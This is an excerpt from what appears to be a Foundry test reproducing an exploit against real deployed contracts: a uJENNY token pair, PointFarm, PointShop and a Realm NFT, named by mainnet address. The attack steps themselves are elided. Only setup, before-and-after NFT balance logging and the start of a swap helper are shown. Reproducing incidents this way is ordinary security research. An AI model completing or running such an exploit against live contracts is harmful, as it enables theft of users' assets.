...
contract ContractTest is Test {
    ...
    IERC20 private constant uJENNY =
        IERC20(0xa499648fD0e80FD911972BbEb069e4c20e68bF22);
    Uni_Pair_V2 private constant uJENNY_WETH =
        Uni_Pair_V2(0xEC5100AD159F660986E47AFa0CDa1081101b471d);
    IPointFarm private constant PointFarm =
        IPointFarm(0xd3C41c85bE295607E8EA5c58487eC5894300ee67);
    IPointShop private constant PointShop =
        IPointShop(0xcDCc535503CBA9286489b338b36156b4b75008f6);
    IERC721 private constant Realm =
    ...
    function testExploit() public {
        ...
        // Attack
        emit log_named_uint(
            "Attacker Realm NFT balance before attack",
            Realm.balanceOf(address(this))
        );
        ...
        emit log_named_uint(
            "Attacker Realm NFT balance after attack",
            Realm.balanceOf(address(this))
        );
    }

    function WETHToUJENNY() internal {
        (uint112 reserveuJENNY, uint112 reserveWETH, ) = uJENNY_WETH
            .getReserves();
